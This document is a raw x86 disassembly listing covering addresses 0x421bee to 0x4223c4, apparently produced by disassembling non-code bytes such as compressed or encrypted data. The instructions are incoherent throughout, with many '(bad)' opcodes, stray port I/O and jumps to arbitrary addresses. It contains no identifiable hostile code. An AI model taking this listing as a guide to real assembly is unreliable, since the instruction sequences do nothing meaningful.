  421bee:	adc    DWORD PTR [ebx+0x41],0xffffffc2
  421bf2:	or     DWORD PTR [edi],0x72bf4870
  421bf8:	jp     0x421c47
  421bfa:	dec    esp
  421bfb:	dec    ebx
  421bfc:	or     al,0x73
  421bfe:	xchg   esp,eax
  421bff:	pushf  
  421c00:	xchg   edx,eax
  421c01:	out    0xab,al
  421c03:	fld    TBYTE PTR [eax]
  421c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c06:	xor    esp,DWORD PTR [esi-0x80]
  421c09:	cdq    
  421c0a:	xchg   esi,eax
  421c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c0c:	push   ecx
  421c0d:	mov    esp,0x78315083
  421c12:	adc    eax,DWORD PTR [edi+edx*8]
  421c15:	popa   
  421c16:	(bad)  
  421c17:	cwde   
  421c18:	(bad)
  421c1c:	xchg   ecx,eax
  421c1d:	mov    eax,0x42c6fb8b
  421c22:	rcr    BYTE PTR [eax],cl
  421c24:	jg     0x421c1f
  421c26:	inc    esi
  421c27:	loope  0x421c83
  421c29:	push   ebx
  421c2a:	adc    al,0x5d
  421c2c:	lahf   
  421c2d:	mov    ch,0xfe
  421c2f:	ret    0xb22c
  421c32:	ss jbe 0x421c1b
  421c35:	dec    edi
  421c36:	mov    eax,0xd7b3125a
  421c3b:	rcl    bl,1
  421c3d:	sub    DWORD PTR [esi],eax
  421c3f:	out    dx,al
  421c40:	or     al,0x8b
  421c42:	aam    0x4e
  421c44:	cli    
  421c45:	dec    edx
  421c46:	js     0x421c76
  421c48:	inc    esi
  421c49:	inc    eax
  421c4a:	sbb    dl,dh
  421c4c:	cmp    eax,0xd3f76dc
  421c51:	and    eax,0x2901beb8
  421c56:	out    0xe4,eax
  421c58:	sbb    eax,esi
  421c5a:	stc    
  421c5b:	push   ecx
  421c5c:	fidiv  WORD PTR [edx+0x49]
  421c5f:	cwde   
  421c60:	call   0x1125:0x7751
  421c66:	faddp  st(2),st
  421c68:	xor    eax,0x35a18872
  421c6d:	xor    DWORD PTR [ecx+0xb2694b9],esi
  421c73:	xchg   ebp,eax
  421c74:	fadd   DWORD PTR [ebx-0x39]
  421c77:	pushf  
  421c78:	sub    ecx,edx
  421c7a:	mov    ds:0x58491d84,al
  421c7f:	and    al,0x16
  421c81:	or     dh,BYTE PTR [eax+0x31]
  421c84:	add    eax,0x276c010c
  421c89:	or     ebp,esp
  421c8b:	ja     0x421cd5
  421c8d:	xor    al,0x8b
  421c8f:	push   ebx
  421c90:	cmp    DWORD PTR [esi+0x3142cb99],esp
  421c96:	or     ebx,DWORD PTR [eax+0x4d]
  421c99:	mov    edx,0x36956be0
  421c9e:	es mov ebp,0x4b988786
  421ca4:	in     eax,dx
  421ca5:	cmp    dl,cl
  421ca7:	pop    es
  421ca8:	inc    edi
  421ca9:	or     eax,0x1669dc79
  421cae:	add    ecx,DWORD PTR [edx+0x21]
  421cb1:	jno    0x421cee
  421cb3:	out    0x59,eax
  421cb5:	adc    ecx,edx
  421cb7:	cmp    DWORD PTR [edi],edi
  421cb9:	xor    eax,0xfcb123ea
  421cbe:	outs   dx,BYTE PTR ds:[esi]
  421cbf:	cld    
  421cc0:	jnp    0x421c8f
  421cc2:	sub    dh,BYTE PTR [ecx+edi*1]
  421cc5:	loop   0x421d30
  421cc7:	(bad)  
  421cc8:	loope  0x421d39
  421cca:	test   eax,0x2fe14f37
  421ccf:	or     esp,DWORD PTR [eax+ebx*2-0x2b]
  421cd3:	jle    0x421c82
  421cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cd6:	push   eax
  421cd7:	in     al,0xd5
  421cd9:	add    al,0x5b
  421cdb:	outs   dx,DWORD PTR ds:[esi]
  421cdc:	idiv   BYTE PTR [bp+si-0x6]
  421ce0:	(bad)  
  421ce1:	jno    0x421d60
  421ce3:	mov    edx,0x84a1d25
  421ce8:	in     al,0xeb
  421cea:	loopne 0x421c7b
  421cec:	repnz xchg esi,eax
  421cee:	cld    
  421cef:	out    dx,eax
  421cf0:	mov    ebp,0xeac9540e
  421cf5:	pmaddwd mm2,mm1
  421cf8:	cmp    BYTE PTR [edx],bh
  421cfa:	(bad)  
  421cfc:	mov    cl,0x88
  421cfe:	or     eax,0xd6c017a5
  421d03:	xchg   edx,eax
  421d04:	gs mov dh,0x33
  421d07:	sub    edx,DWORD PTR [ecx-0x15a6087d]
  421d0d:	jnp    0x421d2b
  421d0f:	popf   
  421d10:	test   DWORD PTR [esi+ebp*8],eax
  421d13:	arpl   WORD PTR [esi+0x3d5b985e],bp
  421d19:	fdivr  DWORD PTR [edi]
  421d1b:	rcl    ebx,0xe0
  421d1e:	mov    al,0x8b
  421d20:	sub    DWORD PTR [esi-0x3e],edx
  421d23:	ss clc 
  421d25:	pusha  
  421d26:	add    bh,BYTE PTR [edx+0x40]
  421d29:	lea    ecx,[ebp+0x30580337]
  421d2f:	xor    BYTE PTR [eax-0x5f],ah
  421d32:	sub    DWORD PTR [eax+0x41dee534],ebx
  421d38:	bound  esp,QWORD PTR [edx]
  421d3a:	into   
  421d3b:	clc    
  421d3c:	mul    esp
  421d3e:	xlat   BYTE PTR ds:[ebx]
  421d3f:	jbe    0x421cf6
  421d41:	dec    eax
  421d42:	adc    DWORD PTR [esi+ebx*1-0x75],ebp
  421d46:	mov    ah,0x20
  421d48:	lds    edx,FWORD PTR [edi-0x2bf8a8c8]
  421d4e:	aam    0x53
  421d50:	sub    DWORD PTR [eax+0x55],0x43
  421d54:	xchg   ebx,eax
  421d55:	sahf   
  421d56:	xchg   esp,eax
  421d57:	mov    ecx,0x69da2e6c
  421d5c:	repz mov esp,0x727b28c6
  421d62:	inc    ebp
  421d63:	in     eax,dx
  421d64:	push   0xf90cfa80
  421d69:	and    DWORD PTR [edi+0x449a5b86],ebp
  421d6f:	push   ebp
  421d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d71:	adc    bl,bl
  421d73:	test   eax,0x2d123f89
  421d78:	inc    eax
  421d79:	sub    DWORD PTR [edi+0x1a],0x78
  421d7d:	je     0x421d8b
  421d7f:	mov    cl,0x9e
  421d81:	or     cl,BYTE PTR [bx+di-0x57]
  421d85:	inc    ecx
  421d86:	push   ss
  421d87:	gs push cs
  421d89:	adc    al,BYTE PTR [edi-0x5982141c]
  421d8f:	mov    dl,0xb0
  421d91:	cmc    
  421d92:	and    BYTE PTR [edx-0x7f],al
  421d95:	or     eax,0x20e449e4
  421d9a:	inc    ebx
  421d9b:	jecxz  0x421d2a
  421d9d:	frstor [ebp-0x3d]
  421da0:	jmp    0x3132b1be
  421da5:	outs   dx,DWORD PTR ds:[esi]
  421da6:	dec    esi
  421da7:	fstp   TBYTE PTR [esi]
  421da9:	inc    ebx
  421daa:	mov    al,0xcb
  421dac:	and    DWORD PTR [ecx-0x7148b957],esp
  421db2:	bound  eax,QWORD PTR [eax-0xce8e2b3]
  421db8:	ret    0xa4c
  421dbb:	(bad)  
  421dbc:	aam    0xdd
  421dbe:	sti    
  421dbf:	push   0xffffffdf
  421dc1:	in     eax,dx
  421dc2:	(bad)  
  421dc4:	push   edi
  421dc5:	outs   dx,BYTE PTR ds:[esi]
  421dc6:	xchg   edi,eax
  421dc7:	stos   BYTE PTR es:[edi],al
  421dc8:	pop    ss
  421dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dca:	(bad)  [ebp-0x52]
  421dcd:	sub    ch,BYTE PTR [ecx+esi*2+0x463c11e6]
  421dd4:	and    al,0xe3
  421dd6:	sbb    edx,DWORD PTR [edi-0x69]
  421dd9:	fmul   DWORD PTR [edx-0x6a48731b]
  421ddf:	xor    DWORD PTR [ebx-0x44],ebx
  421de2:	(bad)  
  421de3:	and    BYTE PTR [edi],ch
  421de5:	and    DWORD PTR [ecx-0x624542b4],eax
  421deb:	bnd jmp DWORD PTR [ebp-0x70fbe22e]
  421df2:	dec    ecx
  421df3:	ror    BYTE PTR [esi+0x36],1
  421df6:	pop    edi
  421df7:	dec    edi
  421df8:	mov    edi,0xda11a651
  421dfd:	jecxz  0x421e6d
  421dff:	out    dx,al
  421e00:	inc    ecx
  421e01:	into   
  421e02:	lea    ebp,[eax]
  421e04:	shl    BYTE PTR [ebp-0x23],0x14
  421e08:	rcr    DWORD PTR [ebp-0x6cb5d18],cl
  421e0e:	inc    edi
  421e0f:	cli    
  421e10:	repnz in eax,dx
  421e12:	lods   eax,DWORD PTR ds:[esi]
  421e13:	xor    BYTE PTR [edx+esi*8-0x30373f26],dh
  421e1a:	push   ecx
  421e1b:	jmp    0x2cbf:0x60b31b5a
  421e22:	jno    0x421e98
  421e24:	jmp    0xaa91007d
  421e29:	jns    0x421ddb
  421e2b:	inc    eax
  421e2c:	and    edi,eax
  421e2e:	ins    DWORD PTR es:[edi],dx
  421e2f:	int3   
  421e30:	add    ecx,edi
  421e32:	dec    eax
  421e33:	push   edx
  421e34:	jns    0x421e1a
  421e36:	mov    al,0xde
  421e38:	idiv   bh
  421e3a:	ds ffreep st(0)
  421e3d:	and    edx,DWORD PTR [eax+0x733f01b5]
  421e43:	aaa    
  421e44:	jb     0x421e28
  421e46:	jecxz  0x421e00
  421e48:	shl    DWORD PTR ds:0x8565f1e0,cl
  421e4e:	out    dx,eax
  421e4f:	cdq    
  421e50:	mov    ecx,0x1395ab13
  421e55:	xor    eax,0x32433b4d
  421e5a:	jl     0x421de0
  421e5c:	or     al,0x47
  421e5e:	dec    edx
  421e5f:	les    eax,FWORD PTR [edx+0xb]
  421e62:	pop    esi
  421e63:	xlat   BYTE PTR ds:[ebx]
  421e64:	push   ebp
  421e65:	lock pop ss
  421e67:	ins    BYTE PTR es:[edi],dx
  421e68:	adc    esi,ebx
  421e6a:	jg     0x421ea1
  421e6c:	dec    ebx
  421e6d:	jge    0x421e31
  421e6f:	mov    cl,0xe0
  421e71:	xor    al,0x1a
  421e73:	mov    bh,0xd3
  421e75:	jmp    0x421e5e
  421e77:	ins    BYTE PTR es:[edi],dx
  421e78:	data16 jp 0x421ee7
  421e7b:	jge    0x421e6f
  421e7d:	mov    ebp,0xdeba19e1
  421e82:	and    edx,DWORD PTR [edi-0x54]
  421e85:	xchg   ebx,eax
  421e86:	xor    eax,0x5a53536a
  421e8b:	gs iret 
  421e8d:	adc    eax,0xd68ad8ae
  421e92:	inc    esp
  421e93:	std    
  421e94:	or     cl,dh
  421e96:	sub    ch,BYTE PTR [ebp+ecx*8-0xf]
  421e9a:	dec    esi
  421e9b:	sbb    ah,0x98
  421e9e:	pop    es
  421e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ea0:	es inc ebx
  421ea2:	mov    esp,0x3a66980b
  421ea7:	cwde   
  421ea8:	mov    edx,0xd943448
  421ead:	sub    edi,esi
  421eaf:	scas   al,BYTE PTR es:[edi]
  421eb0:	and    BYTE PTR [eax+0x6a],bh
  421eb3:	outs   dx,BYTE PTR ds:[esi]
  421eb4:	lahf   
  421eb5:	rcl    DWORD PTR [eax],1
  421eb7:	(bad)  
  421eb8:	mov    cl,0xb6
  421eba:	pop    es
  421ebb:	push   esp
  421ebc:	call   FWORD PTR [edx+0x10]
  421ebf:	nop    DWORD PTR [edx+0x648385e]
  421ec6:	imul   esi,DWORD PTR [edi+0x37d7330c],0x125761e0
  421ed0:	fst    QWORD PTR [ebx+0x2f]
  421ed3:	sub    edx,edx
  421ed5:	jmp    0x421e6c
  421ed7:	pushf  
  421ed8:	pushf  
  421ed9:	push   esi
  421eda:	popf   
  421edb:	loopne 0x421f0d
  421edd:	adc    al,0x2a
  421edf:	add    edx,0xfffffff3
  421ee2:	mov    ebp,0xf750d7c5
  421ee7:	mov    dh,0x7a
  421ee9:	lods   al,BYTE PTR ds:[esi]
  421eea:	inc    ebx
  421eeb:	mov    edi,0x645308e7
  421ef0:	(bad)  
  421ef1:	inc    DWORD PTR [esi]
  421ef3:	xchg   ch,dl
  421ef5:	inc    ebp
  421ef6:	cmp    bh,BYTE PTR [eax-0x51f5d892]
  421efc:	fist   WORD PTR [edx+0x49ae18af]
  421f02:	test   al,0x9c
  421f04:	jle    0x421eaa
  421f06:	mov    al,ds:0xd62be592
  421f0b:	pushf  
  421f0c:	imul   ebx,ebx,0x9776632f
  421f12:	sbb    cl,BYTE PTR [ebx+0xbdcedb]
  421f18:	call   DWORD PTR [edi-0x37c736f6]
  421f1e:	mov    esp,0x905c8f7b
  421f23:	scas   al,BYTE PTR es:[edi]
  421f24:	nop
  421f25:	push   ds
  421f26:	xor    al,0x9a
  421f28:	jb     0x421f41
  421f2a:	rcl    dl,cl
  421f2c:	aad    0xfc
  421f2e:	adc    ecx,DWORD PTR [esi+0x6c]
  421f31:	ror    DWORD PTR [esi+0x48dd5be8],0xa1
  421f38:	out    dx,eax
  421f39:	imul   ebp,edx,0x4510255d
  421f3f:	add    eax,0x5f30b9ae
  421f44:	inc    ecx
  421f45:	faddp  st(4),st
  421f47:	aam    0x4f
  421f49:	jno    0x421f79
  421f4b:	pop    ebp
  421f4c:	hlt    
  421f4d:	or     eax,esi
  421f4f:	push   cs
  421f50:	fisubr DWORD PTR [esi]
  421f52:	out    0x1e,eax
  421f54:	xchg   edx,eax
  421f55:	or     BYTE PTR [esp+esi*1],bh
  421f58:	dec    ebp
  421f59:	outs   dx,BYTE PTR ds:[esi]
  421f5a:	inc    edx
  421f5b:	pop    esp
  421f5c:	or     BYTE PTR [ecx-0x5f],bl
  421f5f:	sbb    bh,BYTE PTR [eax]
  421f61:	packssdw mm3,mm4
  421f64:	xchg   ebx,eax
  421f65:	(bad)  
  421f66:	dec    esi
  421f67:	js     0x421fcb
  421f69:	cdq    
  421f6a:	sub    bl,ch
  421f6c:	enter  0x7d6e,0xe4
  421f70:	nop
  421f71:	mov    edx,ebx
  421f73:	add    eax,0xf9f155f8
  421f78:	mov    ebp,?
  421f7a:	bound  edi,QWORD PTR [ebx-0x51]
  421f7d:	call   0x84fa257d
  421f82:	fwait
  421f83:	shr    BYTE PTR [esi-0x50804dd9],0x38
  421f8a:	push   ss
  421f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f8c:	push   ds
  421f8d:	cli    
  421f8e:	dec    ecx
  421f8f:	cmp    ebp,edx
  421f91:	repz pop es
  421f93:	jle    0x421fd5
  421f95:	js     0xa7966688
  421f9b:	mov    edi,0x35eb4523
  421fa0:	mov    ch,0xdf
  421fa2:	xchg   edi,eax
  421fa3:	and    al,0xee
  421fa5:	mov    eax,0x6d4a39d4
  421faa:	jmp    FWORD PTR [ecx+0x12]
  421fad:	pop    edx
  421fae:	loope  0x421f8e
  421fb0:	ror    BYTE PTR [ebx],cl
  421fb2:	push   ss
  421fb3:	outs   dx,BYTE PTR ds:[esi]
  421fb4:	xchg   esp,eax
  421fb5:	icebp  
  421fb6:	xchg   edi,eax
  421fb7:	push   0xffffff90
  421fb9:	inc    eax
  421fba:	lock fadd QWORD PTR [esi-0x7c]
  421fbe:	or     eax,0x9246208a
  421fc3:	xchg   ecx,eax
  421fc4:	dec    edx
  421fc5:	gs nop
  421fc7:	scas   al,BYTE PTR es:[edi]
  421fc8:	ret    
  421fc9:	(bad)  
  421fcb:	cmp    esi,DWORD PTR [edi-0x53fab02c]
  421fd1:	push   0xd74f746e
  421fd6:	jbe    0x422002
  421fd8:	push   ebp
  421fd9:	jne    0x422030
  421fdb:	xlat   BYTE PTR ds:[ebx]
  421fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fdd:	(bad)  
  421fde:	shr    DWORD PTR [ebp-0x65],1
  421fe1:	sbb    dl,BYTE PTR [edx+0x5687ed9]
  421fe7:	or     edi,esp
  421fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fea:	push   ebx
  421feb:	mov    dh,BYTE PTR [eax-0x76f2248e]
  421ff1:	sbb    al,0x60
  421ff3:	xchg   eax,ebp
  421ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ff6:	ret    
  421ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ff8:	in     al,dx
  421ff9:	aaa    
  421ffa:	inc    edi
  421ffb:	xchg   ecx,eax
  421ffc:	add    esi,ecx
  421ffe:	mov    ecx,0x49add177
  422003:	or     ah,BYTE PTR [edi+0x5b5ad832]
  422009:	sbb    eax,0x28f1f1c8
  42200e:	sbb    DWORD PTR [esi],edi
  422010:	outs   dx,BYTE PTR ds:[esi]
  422011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422012:	add    al,0xac
  422014:	sub    bh,BYTE PTR [ebx]
  422016:	sbb    eax,0xc0344be0
  42201b:	into   
  42201c:	or     eax,0xf24502f3
  422021:	dec    esi
  422022:	pop    ds
  422023:	cwde   
  422024:	daa    
  422025:	and    edx,DWORD PTR [edi+0x5bbb4d4d]
  42202b:	hlt    
  42202c:	pusha  
  42202d:	push   eax
  42202e:	call   0x6f676e7b
  422033:	adc    BYTE PTR [esi],0xb0
  422036:	push   esp
  422037:	mov    ebp,0x7d2c29fe
  42203c:	sti    
  42203d:	mov    bl,0x49
  42203f:	mov    ds:0xc36882f8,eax
  422044:	pusha  
  422045:	mov    cl,0x33
  422047:	pop    esp
  422048:	lea    edi,[eax]
  42204a:	jl     0x422087
  42204c:	dec    ebp
  42204d:	cs scas eax,DWORD PTR es:[edi]
  42204f:	sub    BYTE PTR [ecx],cl
  422051:	aam    0xfe
  422053:	add    ch,ah
  422055:	mov    ebx,0xf5e6260a
  42205a:	mov    bh,0x96
  42205c:	sub    DWORD PTR ds:0x5d833049,0x5e
  422063:	test   DWORD PTR [eax+ebp*1-0x6b669e7b],eax
  42206a:	loop   0x4220e9
  42206c:	lods   eax,DWORD PTR ds:[esi]
  42206d:	pop    esi
  42206e:	sub    ebp,DWORD PTR [eax]
  422070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422071:	jg     0x421ffb
  422073:	mov    ecx,0xc127e179
  422078:	sub    bh,BYTE PTR [ecx-0x703e85bc]
  42207e:	xor    DWORD PTR [ebp-0xb2f8c2d],ecx
  422084:	sbb    DWORD PTR [ecx+eax*1],0x8ba4850d
  42208b:	xchg   DWORD PTR [ebp+0x4c],eax
  42208e:	xor    al,0x5e
  422090:	mov    esi,db1
  422093:	cmp    DWORD PTR [ebp-0x28f9bd6b],ebp
  422099:	jae    0x4220fb
  42209b:	icebp  
  42209c:	mov    gs,edi
  42209e:	or     BYTE PTR [ecx-0x62],cl
  4220a1:	(bad)  gs:[ecx]
  4220a4:	jnp    0x4220fc
  4220a6:	fld    QWORD PTR [ecx-0x3a]
  4220a9:	xchg   edi,eax
  4220aa:	(bad)  
  4220ab:	das    
  4220ac:	lahf   
  4220ad:	mov    cl,ah
  4220af:	pop    eax
  4220b0:	ds into 
  4220b2:	clc    
  4220b3:	and    eax,0x2d7bfd52
  4220b8:	mov    bh,0xe
  4220ba:	mov    al,0x1b
  4220bc:	stc    
  4220bd:	add    BYTE PTR [eax*2-0x3bbd19d7],dh
  4220c4:	and    DWORD PTR [ecx],ebx
  4220c6:	stos   BYTE PTR es:[edi],al
  4220c7:	add    BYTE PTR [edx],al
  4220c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220ca:	adc    eax,0xc9379b3c
  4220cf:	dec    edx
  4220d0:	cmp    al,0x0
  4220d2:	ret    
  4220d3:	xchg   DWORD PTR ds:0x9e4087f0,esi
  4220d9:	imul   eax,DWORD PTR [ecx+0x2f],0x4d
  4220dd:	inc    ecx
  4220de:	mov    bl,0x6f
  4220e0:	test   al,0x4c
  4220e2:	inc    ecx
  4220e3:	sbb    DWORD PTR ds:0xb26fb77a,esp
  4220e9:	jns    0x4220de
  4220eb:	dec    ebx
  4220ec:	scas   al,BYTE PTR es:[edi]
  4220ed:	jge    0x422087
  4220ef:	jmp    0xcf646919
  4220f4:	popa   
  4220f5:	test   DWORD PTR [edx+ecx*4-0x28],ebx
  4220f9:	test   dl,0x3d
  4220fc:	jle    0x4220a7
  4220fe:	fwait
  4220ff:	mov    eax,?
  422101:	nop
  422102:	shr    BYTE PTR [edi],1
  422104:	inc    edx
  422105:	int3   
  422106:	xor    edi,esi
  422108:	enter  0xd704,0x34
  42210c:	ret    0x3768
  42210f:	stc    
  422110:	dec    esp
  422111:	imul   edi,esp,0x71e1ace0
  422117:	ror    DWORD PTR [ecx+0x2b],0x4b
  42211b:	inc    ecx
  42211c:	xchg   edi,eax
  42211d:	jmp    0xf470:0x3c491295
  422124:	aas    
  422125:	jbe    0x4220d8
  422127:	xchg   edi,eax
  422128:	fcomp  DWORD PTR [ecx-0xa1f4251]
  42212e:	lods   eax,DWORD PTR ds:[esi]
  42212f:	adc    esp,DWORD PTR [ebp-0xd9274b4]
  422135:	arpl   WORD PTR [ebx],di
  422137:	mov    bh,0x3e
  422139:	or     eax,0x92e21f45
  42213e:	lods   al,BYTE PTR ds:[esi]
  42213f:	shl    DWORD PTR [edx+ecx*8+0x23],1
  422143:	add    al,0x34
  422145:	ins    BYTE PTR es:[edi],dx
  422146:	not    BYTE PTR [edi]
  422148:	cmp    al,0x88
  42214a:	dec    ecx
  42214b:	jle    0x422116
  42214d:	adc    esi,esp
  42214f:	add    BYTE PTR [ebp+0x5fd20127],ch
  422155:	xchg   esp,eax
  422156:	mov    bl,0x56
  422158:	jl     0x422178
  42215a:	jb     0x4220f5
  42215c:	mov    dh,0xef
  42215e:	outs   dx,BYTE PTR ds:[esi]
  42215f:	push   eax
  422160:	or     eax,0x24068c84
  422165:	outs   dx,DWORD PTR ds:[esi]
  422166:	sbb    DWORD PTR [edi+eax*8],eax
  422169:	and    ebp,DWORD PTR [eax+0x3f]
  42216c:	retf   0xb520
  42216f:	and    dl,BYTE PTR [ecx-0x454a0365]
  422175:	aas    
  422176:	cmp    ch,BYTE PTR [ebp+0x11]
  422179:	pop    ebp
  42217a:	rcl    dh,1
  42217c:	mov    ds:0xc7f1cb3f,eax
  422181:	bnd jge 0x422164
  422184:	push   ebp
  422185:	or     bl,BYTE PTR [ebp-0x43c8b91f]
  42218b:	pop    ebx
  42218c:	(bad)  
  42218d:	push   edi
  42218e:	fld    DWORD PTR [ebx+esi*8+0x11]
  422192:	and    al,0xea
  422194:	out    dx,eax
  422195:	dec    ecx
  422197:	cmp    eax,0x95250906
  42219c:	fisub  DWORD PTR [edx+ecx*2-0x7b]
  4221a0:	es out dx,al
  4221a2:	sbb    ah,BYTE PTR ds:[eax]
  4221a5:	inc    ebx
  4221a6:	or     eax,0x85bb3384
  4221ab:	sub    BYTE PTR [ebp+0x7ed0fc75],ch
  4221b1:	iret   
  4221b2:	icebp  
  4221b3:	loop   0x422232
  4221b5:	aam    0x93
  4221b7:	mov    eax,0xe1154394
  4221bc:	ficomp WORD PTR [esp+eax*1-0x3e]
  4221c0:	xor    eax,0xbd8fb9e3
  4221c5:	retf   0xbe06
  4221c8:	sub    bl,BYTE PTR [esp+eax*8+0x28]
  4221cc:	xor    bh,BYTE PTR [esi]
  4221ce:	retf   
  4221cf:	adc    BYTE PTR [eax+0x12],0x86
  4221d3:	push   DWORD PTR [esi+0x73]
  4221d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221d7:	nop    esi
  4221da:	mov    esi,0x622f72a1
  4221df:	shr    DWORD PTR [ecx+0x27],1
  4221e2:	dec    esp
  4221e3:	cmc    
  4221e4:	pop    edx
  4221e5:	and    al,0xe
  4221e7:	psubw  mm6,QWORD PTR [edi+0x28b1a61]
  4221ee:	push   ecx
  4221ef:	div    edi
  4221f1:	xchg   ebx,eax
  4221f2:	push   0x35dccfb8
  4221f7:	(bad)  
  4221f8:	mov    ds:0xfbab1de3,al
  4221fd:	(bad)  ss:[edx-0xc759dca]
  422204:	or     edx,DWORD PTR [ebx-0x1e]
  422207:	pushf  
  422208:	data16 cmp bl,BYTE PTR [ecx+0x112504a0]
  42220f:	sahf   
  422210:	sub    DWORD PTR [ebp+0x5f0826ab],ebp
  422216:	mov    ds:0x7ecd6657,eax
  42221b:	add    bl,BYTE PTR [edx]
  42221d:	int    0xd9
  42221f:	(bad)  
  422221:	sub    BYTE PTR [esi],0xb2
  422224:	xor    ebx,DWORD PTR [ebp+0x6]
  422227:	shl    DWORD PTR gs:[ecx-0x255b521b],cl
  42222e:	dec    ebx
  42222f:	enter  0x57a4,0xe5
  422233:	loope  0x42224c
  422235:	sub    ebp,DWORD PTR [esi-0x34]
  422238:	faddp  st(3),st
  42223a:	ror    DWORD PTR [ebx-0x35],1
  42223d:	mov    WORD PTR [ebp+ebp*8+0x4e60bc93],?
  422244:	std    
  422245:	bound  ecx,QWORD PTR [eax+0x4927ae12]
  42224b:	(bad)  
  42224c:	mov    edx,0xd21465bd
  422251:	mov    esp,0x64df4d37
  422256:	imul   edi,DWORD PTR [esi-0x29e3ebb1],0xffffff8e
  42225d:	sbb    eax,0x4c051719
  422262:	dec    ebp
  422263:	and    eax,0xddd66bc1
  422268:	pushf  
  422269:	add    bl,BYTE PTR [eax+0x28e0c76b]
  42226f:	jns    0x42226a
  422271:	cld    
  422272:	push   esp
  422273:	mov    esp,0x25fced36
  422278:	adc    bl,BYTE PTR [eax]
  42227a:	jge    0x4222da
  42227c:	jae    0x42222e
  42227e:	arpl   WORD PTR [esi],ax
  422280:	imul   eax,ebp,0xffffffbe
  422283:	pop    ebp
  422284:	inc    esp
  422285:	fwait
  422286:	jmp    0xce6a3450
  42228b:	mov    edx,0x7924854a
  422290:	add    eax,0x66fc31e8
  422295:	add    bh,0x6
  422298:	gs push ebx
  42229a:	xchg   esp,eax
  42229b:	ror    al,0x2b
  42229e:	call   0x63f8:0x59b91ac9
  4222a5:	pop    esp
  4222a6:	jg     0x422295
  4222a8:	mov    bl,0x45
  4222aa:	shl    BYTE PTR ds:0xd42ebbb4,0xf0
  4222b1:	stos   BYTE PTR es:[edi],al
  4222b2:	pop    ecx
  4222b3:	xchg   ecx,eax
  4222b4:	dec    eax
  4222b5:	ss out dx,eax
  4222b7:	jne    0x4222cf
  4222b9:	push   ds
  4222ba:	mov    eax,0x3acdcc66
  4222bf:	ret    
  4222c0:	(bad)  
  4222c2:	iret   
  4222c3:	or     ecx,DWORD PTR [ebx]
  4222c5:	xor    BYTE PTR [esi],ch
  4222c7:	adc    eax,DWORD PTR [ecx-0x25c0bdec]
  4222cd:	ja     0x42233a
  4222cf:	push   edx
  4222d0:	jae    0x422320
  4222d2:	mov    bh,0x9
  4222d4:	fld    QWORD PTR [edx+0x495332b0]
  4222da:	in     al,dx
  4222db:	in     al,0x23
  4222dd:	dec    ecx
  4222de:	dec    ebp
  4222df:	mov    ecx,0x57cfa6a3
  4222e4:	mov    DWORD PTR [esi-0x20cf5685],eax
  4222ea:	test   BYTE PTR [esi+0x129a209],bh
  4222f0:	lds    edx,FWORD PTR [edi+0x4c660050]
  4222f6:	sbb    al,0xa1
  4222f8:	dec    ebp
  4222f9:	pop    ebx
  4222fa:	mov    ah,0x15
  4222fc:	sub    ch,al
  4222fe:	sub    BYTE PTR [edx],dh
  422300:	aaa    
  422301:	add    bl,cl
  422303:	int    0x6f
  422305:	ret    
  422306:	ficomp DWORD PTR [eax+0x41]
  422309:	lds    edi,FWORD PTR [esi+0x62]
  42230c:	test   eax,0x4adc3a98
  422311:	in     eax,dx
  422312:	push   esp
  422313:	push   eax
  422314:	push   es
  422315:	test   al,0x1
  422317:	into   
  422318:	pusha  
  422319:	cmp    DWORD PTR [edi],0x1e
  42231c:	jb     0x422367
  42231e:	bound  edi,QWORD PTR [ebp-0x715def2e]
  422324:	stos   BYTE PTR es:[edi],al
  422325:	inc    ebp
  422326:	adc    ebp,DWORD PTR [edx-0x3e]
  422329:	div    DWORD PTR [esi+0x323d0e21]
  42232f:	in     al,0x29
  422331:	out    dx,al
  422332:	pop    ds
  422333:	mov    edx,0xea7c18c9
  422338:	and    ebp,esi
  42233a:	(bad)  
  42233b:	call   0x4a2dc30c
  422340:	adc    ebp,DWORD PTR [ecx+0x6a84831]
  422346:	stos   BYTE PTR es:[edi],al
  422347:	sub    eax,0x841ac25d
  42234c:	pop    es
  42234d:	ins    BYTE PTR es:[edi],dx
  42234e:	int    0x28
  422350:	jp     0x422357
  422352:	push   esi
  422353:	mov    cl,0xa1
  422355:	mov    ebp,0x22a620e1
  42235a:	aad    0x7b
  42235c:	xchg   edx,eax
  42235d:	mov    ebp,0x75e7bd69
  422362:	pop    ss
  422363:	pushf  
  422364:	stc    
  422365:	xchg   dh,dl
  422367:	push   edi
  422368:	xor    DWORD PTR [ebx-0x31022c9c],ebp
  42236e:	(bad)  
  42236f:	idiv   DWORD PTR [esi-0x789dd2f9]
  422375:	pop    ecx
  422376:	mov    WORD PTR [ecx+edx*8+0x63],?
  42237a:	call   0xaf7b:0x4237edc7
  422381:	push   ebx
  422382:	lock mov ds:0x4b6a38f4,al
  422388:	mov    esi,0x9ddb407e
  42238d:	imul   eax,DWORD PTR [edx-0x71df88fe],0xc4c48f60
  422397:	pop    edi
  422398:	jmp    0x42232f
  42239a:	cmp    eax,0xb0849e3
  42239f:	mov    al,0x91
  4223a1:	mov    eax,ds:0xaae3817e
  4223a6:	mov    WORD PTR [edi-0x54],ss
  4223a9:	push   ebx
  4223aa:	ror    BYTE PTR [ebx+0x57],0x7f
  4223ae:	inc    BYTE PTR ds:0x4dc752da
  4223b4:	xor    cl,bl
  4223b6:	and    dl,al
  4223b8:	mov    ecx,0xc0c119b5
  4223bd:	in     eax,0x4d
  4223bf:	inc    edx
  4223c0:	push   ebx
  4223c1:	xchg   esp,eax
  4223c2:	fwait
  4223c3:	dec    esp
  4223c4:	xor    ch,al
